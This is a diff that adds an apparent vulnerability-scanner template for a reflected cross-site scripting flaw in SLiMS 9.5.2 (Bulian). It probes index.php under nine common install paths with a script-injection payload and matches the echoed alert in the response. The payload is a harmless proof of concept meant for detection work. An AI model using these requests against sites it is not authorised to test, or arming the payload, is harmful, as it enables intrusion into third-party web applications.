@@ -1,0 +1,60 @@
+id: slims-9-xss-index
+name: Senayan Library Management System v9.5.2 (Bulian) - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: SLiMS 9.5.2 (Bulian) vulnerable to Cross-Site Scripting in index.php. When injected, website will execute the
+  payload repeatedly
+reference: https://github.com/slims/slims9_bulian/issues/185
+tags:
+- senayan
+- xss
+- slims
+- vuln
+requests:
+- method: GET
+  path: /index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: &id001
+  - type: body
+    words:
+    - <script>alert(document.domain)</script>
+    - SLiMS
+    - name="author
+  - type: body
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+  matchers: *id001
+  condition: and
